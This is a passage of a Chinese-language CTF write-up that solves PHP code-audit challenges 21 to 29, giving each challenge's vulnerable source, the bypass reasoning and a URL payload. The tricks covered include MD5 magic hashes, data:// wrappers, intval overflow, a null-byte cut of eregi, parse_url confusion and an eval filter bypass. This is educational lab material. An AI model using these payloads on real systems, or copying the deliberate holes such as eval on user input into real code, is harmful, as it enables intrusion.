<li>$matches: 多维数组，作为输出参数输出所有匹配结果, 数组排序通过flags指定。</li>
<li>$flags：可以结合下面标记使用(注意不能同时使用PREG_PATTERN_ORDER和 PREG_SET_ORDER)：</li>
</ul>
<ol>
<li>PREG_PATTERN_ORDER:  结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配，以此类推。</li>
<li>PREG_SET_ORDER:  结果排序为$matches[0]包含第一次匹配得到的所有匹配(包含子组)， $matches[1]是包含第二次匹配到的所有匹配(包含子组)的数组，以此类推。</li>
<li>PREG_OFFSET_CAPTURE:  如果这个标记被传递，每个发现的匹配返回时会增加它相对目标字符串的偏移量。</li>
</ol>
<ul>
<li>offset: 通常， 查找时从目标字符串的开始位置开始。可选参数offset用于 从目标字符串中指定位置开始搜索(单位是字节)。</li>
</ul>
<p><strong>if (6 &gt; preg_match_all($reg, $password, $arr))表示把连续的大写，小写，数字，符号作为一段，至少分六段</strong></p>
</blockquote>
<ol>
<li>可见字符超过12</li>
<li>字符串中，把连续的大写，小写，数字，符号作为一段，至少分六段，例如a12SD+io8可以分成a 12 SD + io 8六段</li>
<li>大写，小写，数字，符号这四种类型至少要出现三种，如下：</li>
</ol>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589193100660.png" alt="1589193100660"></p>
<p>接着就是满足<code>if (&quot;42&quot; == $password)</code>,使用十六进制为<code>0x2A</code>，这里已经满足3，满足1只需要再前面添加0即可，但是正则2却没办法满足，在16进制前后加符号和小数点都会破坏在判断相等时进行的转换<br>接下来想到科学计数法<br>42=4.2e1=420e-1=420.000000e-1<br>payload:</p>
<blockquote>
<p>password=420.000000e-1</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589193740643.png" alt="1589193740643"></p>
<h1 id="challenge22"><a href="#challenge22" class="headerlink" title="challenge22"></a>challenge22</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>) <span class="keyword">and</span> <span class="keyword">die</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Wonderbubulous! Flag is "</span>.$flag;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Nah... '"</span>,htmlspecialchars($md5),<span class="string">"' not the same as "</span>,md5($md5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>MD5弱类型比较<br>双MD5碰撞脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!python2</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MD5</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(data).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    a = <span class="number">100000000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = <span class="string">'0e'</span> + str(a)</span><br><span class="line">        data_md5 = MD5(data)</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>,data_md5)):</span><br><span class="line">            print(data)</span><br><span class="line">            print(data_md5)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(a % <span class="number">1000000</span> == <span class="number">0</span>):</span><br><span class="line">            print(a)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>结果<code>0e215962017</code></p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589194023888.png" alt="1589194023888"></p>
<h1 id="challenge23"><a href="#challenge23" class="headerlink" title="challenge23"></a>challenge23</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    @$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">    @$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(@file_get_contents($k1)===<span class="string">"Hello hacker!"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'welcome! Hacker!&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">if</span>(md5($k2)&gt;<span class="number">666666</span>*<span class="number">666666</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>); </span><br><span class="line">            @$k3=$_GET[<span class="string">'key3'</span>];</span><br><span class="line">            @$k4=$_GET[<span class="string">'key4'</span>];</span><br><span class="line">            <span class="keyword">if</span>(intval($k3)&lt;<span class="number">666</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>($k3==<span class="number">666</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Come on, flag is coming&lt;br&gt;'</span>;</span><br><span class="line">                    <span class="keyword">if</span>($k4&gt;<span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(intval($k3+$k4)&lt;<span class="number">666</span>)</span><br><span class="line">                            <span class="keyword">echo</span> $flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先使用<code>file_get_contents</code>获取到$k1的文本的内容要等于<code>Hello hacker!</code>,这个以前遇到了很多次，基本就是使用data://为协议来传参</p>
<blockquote>
<p>?key1=data://text/plain;base64,SGVsbG8gaGFja2VyIQ==</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589200437110.png" alt="1589200437110"></p>
<p>$k2要求是key2的md5的值要大于<code>666666*666666</code>所以直接 找一个MD5全是数字的字符串即可，<code>1518375</code>满足条件。<br><img src="/2020/05/12/PHP_Code_Challenge/1589204540462.png" alt="1589204540462"></p>
<p>字符串<code>skwerl11</code>也可以， 它的md5值是<code>1e21ff98693770b768e4a1a4a704811b</code>, <code>1e</code>是科学计数法</p>
<p>key3需要key3的值转换成int之后小于666, 同时需要原始的值等于666， 可以使用精度绕过<code>665.9999999999999999999</code>，还可以使用十六进制绕过<code>0x29a</code></p>
<p>最后一个是key4, 由于intval的表达范围是有限制的，取决于操作系统，所以用了溢出</p>
<p>payload:</p>
<blockquote>
<p>?key1=data://text/plain;base64,SGVsbG8gaGFja2VyIQ==&amp;key2=skwerl11&amp;key3=0x29a&amp;key4=999999999999999999999999999999999999999999999999999999</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589205337746.png" alt="1589205337746"></p>
<h1 id="challenge24"><a href="#challenge24" class="headerlink" title="challenge24"></a>challenge24</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</span><br><span class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array($a))&#123;</span><br><span class="line">   is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</span><br><span class="line">       ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</span><br><span class="line">       $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</span><br><span class="line">       $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">       <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">           $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       $v2=<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c=@$_GET[<span class="string">'cat'</span>];</span><br><span class="line">$d=@$_GET[<span class="string">'dog'</span>];</span><br><span class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</span><br><span class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</span><br><span class="line">       eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">       strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1.</strong>传入的<code>foo</code>，经过一次<code>json_decode</code>，然后转换成<code>array</code>。然后判断 <code>$a[&quot;bar1&quot;]</code>是否满足 <code>is_numeric</code>，若满足则die掉。接下来又判断 <code>$a[&quot;bar1&quot;]</code>是否大于 2016 。</p>
<p>利用php弱类型特性，可以设置</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">a</span>[<span class="string">"bar1"</span>] = <span class="number">2017</span><span class="keyword">a</span></span><br></pre></td></tr></table></figure>

<p>这样<code>is_numeric</code>时会判断其为字符串而不是数字，而在与2016的比较中，会直接转换成2017，满足大于2016。这样 v1 就被设置为 1 了</p>
<p><strong><em>2.</em></strong>接下来，要求<code>$a[&quot;bar2&quot;]</code>是个数组，其中元素的个数为5个<code>（count($a[&quot;bar2&quot;])!==5）</code>，同时要求<code>$a[&quot;bar2&quot;][0]</code>是数组。所以我们设置:</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">$a[<span class="string">"bar2"</span>] = [[],<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br></pre></td></tr></table></figure>

<p>对于 <code>$pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);</code>，它搜索字符串<code>“nudt”</code>在<code>$a[&quot;a2&quot;]</code>中的位置。若没有找到，<code>array_search</code>返回<code>false</code>，会通过严格比较导致die掉。所以这里要设置：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$a</span>[<span class="string">"a2"</span>] = “nudt”</span><br></pre></td></tr></table></figure>

<p>注意这里因为用了<code>$pos===false?</code>的严格比较，所以0不<code>===false</code>。</p>
<p>之后就能设置 <code>v2 = 1</code></p>
<p><strong>3.</strong>先会用<code>strcmp</code>进行比较，利用数组array和字符串进行strcmp比较会返回null，而且数组array也不会等于字符串，我们可以设置<code>cat[1]</code>为一个数组。</p>
<p>接下来用<code>eregi</code>对拼接后的字符串<code>$d.$c[0]</code>进行正则匹配，若匹配到则die掉。而下一步又要求拼接字符串<code>$c[0]</code>.<code>$d</code>中要有字符串<code>“htctf2016”</code>。这里利用<code>%00</code>对<code>eregi</code>的截断功能，则在正则匹配<code>eregi</code>时在开头时就匹配结束掉。</p>
<p><code>strpos(($c[0].$d), &quot;htctf2016&quot;)</code>中，还要求<code>“htctf2016”</code>不能出现在开头。</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$d = %00 即 dog=%00</span><br><span class="line"></span><br><span class="line">$c[<span class="number">0</span>]  = <span class="string">"ahtctf2016"</span></span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<blockquote>
<p>?foo={“bar1”:”2017e”,”bar2”:[[],2,3,4,5],”a2”:[“nudt”]}&amp;cat[0]=ahtctf2016&amp;cat[1][]=&amp;dog=%00</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589264462522.png" alt="1589264462522"></p>
<h1 id="challenge25"><a href="#challenge25" class="headerlink" title="challenge25"></a>challenge25</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/flag.php"</span>;</span><br><span class="line"></span><br><span class="line">    $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    $params = explode(<span class="string">"&amp;"</span>, $url_query);  <span class="comment">#把字符串打散为数组</span></span><br><span class="line">    <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">        <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">            $key = $param;</span><br><span class="line">            $value = <span class="string">""</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">            $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里有一个正则：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>但是题目却要求我们使用<code>do_you_want_flag=yes</code>来获取flag显然相互矛盾，我们寻找漏洞点，发现url的解析工作有由<code>parse_url()</code>操作此时相当<code>parse_url</code>一个解析漏洞，详情参考这篇文章:</p>
<p><a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/</a></p>
<p>4.所以我最后的bypass payload为:</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="comment">///?do_you_want_flag=yes</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589265667662.png" alt="1589265667662"></p>
<h1 id="challenge26"><a href="#challenge26" class="headerlink" title="challenge26"></a>challenge26</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>]) <span class="keyword">unset</span>($username);</span><br><span class="line">        <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">        <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($username == <span class="string">'15th_HackingCamp'</span> &amp;&amp; md5($password) == md5(file_get_contents(<span class="string">'./secret.passwd'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里要求不能输入username，并且输入的vaule不在ascii码可见范围内但是最后又要求value经过chr后拼接的username为<code>15th_HackingCamp</code>，这里可以利用强转和弱比较<br>脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ($i &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">    $test = $i.<span class="string">"e1"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($test &gt; <span class="number">32</span> &amp;&amp; $test &lt; <span class="number">127</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ord(chr($test))&gt;<span class="number">32</span>)&amp;&amp;(ord(chr($test))&lt;<span class="number">127</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"test:"</span>.$test.<span class="string">"   chr:"</span>.chr($test).<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     $i = $i+<span class="number">0.1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589268617202.png" alt="1589268617202"></p>
<p>之后拼接成我们想要的字符串就可以了</p>
<p>payload:</p>
<blockquote>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">value</span>[]=<span class="number">56.100000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">82.1e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">88.499999999999e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">87.299999999999e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">86.399999999999e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">84.099999999999e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">60.900000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">61.100000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">61.900000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">61.700000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">62.200000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">61.500000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">57.900000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">60.900000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">62.100000000001e1</span>&amp;<span class="keyword">value</span>[]=<span class="number">62.400000000001e1</span>&amp;<span class="keyword">password</span>=simple_passw0rd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589269001817.png" alt="1589269001817"></p>
<h1 id="challenge27"><a href="#challenge27" class="headerlink" title="challenge27"></a>challenge27</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>], $_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'hard_login_check'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Already logged in..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]&#123;<span class="number">3</span>&#125;) || strtolower($_GET[<span class="string">'username'</span>]) != $hidden_username)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Wrong username..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]&#123;<span class="number">7</span>&#125;) || $_GET[<span class="string">'password'</span>] != $hidden_password)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Wrong password..'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $_SESSION[<span class="string">'hard_login_check'</span>] = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login success!'</span>;</span><br><span class="line">            header(<span class="string">'Location: ./'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里发现代码里面没有输出flag的地方，无论怎样都会发生跳转，于是使用抓包抓取index.php<br><img src="/2020/05/12/PHP_Code_Challenge/1589245105639.png" alt="1589245105639"></p>
<h1 id="challenge28"><a href="#challenge28" class="headerlink" title="challenge28"></a>challenge28</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>审计代码发现正则写法为:</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">/^<span class="comment">(.*)</span>flag<span class="comment">(.*)</span>$/</span><br></pre></td></tr></table></figure>

<p>4.而这个写法是存在缺陷的:<code>.</code>用于任意字符匹配并不包括换行符，而且<code>^ $</code>界定了必须在同一行，否则匹配不到，也就是说，换行的话，即可破解所以payload为：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">say</span>=%0agive_me_the_flag</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589208538876.png" alt="1589208538876"></p>
<h1 id="challenge29"><a href="#challenge29" class="headerlink" title="challenge29"></a>challenge29</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What\'s going on?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里过滤了很多关键字</p>
<p>最后发现可以用以下方式绕过，直接输出比如</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>=$flag=<span class="string">'123'</span>;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以直接得到结果：123那么我们在这题中，只要构造出<code>&lt;?=$flag?&gt;</code>即可立刻输出我们要的flag，而不需要再去管sha1的相等问题那么如何构造<code>$flag</code>呢？可以用拼接的方式:</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$a</span>=<span class="string">'alag'</span>;<span class="symbol">$a</span>&#123;<span class="number">0</span>&#125;=<span class="string">'f'</span>;</span><br></pre></td></tr></table></figure>

<p>于是最后的payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?flag=$a=<span class="string">'alag'</span>;$a&#123;<span class="number">0</span>&#125;=<span class="string">'f'</span>;<span class="number">1111111111111111</span>;<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$&#123;$a&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589208146743.png" alt="1589208146743"></p>
<h1 id="challenge30"><a href="#challenge30" class="headerlink" title="challenge30"></a>challenge30</h1><p>源码：</p>
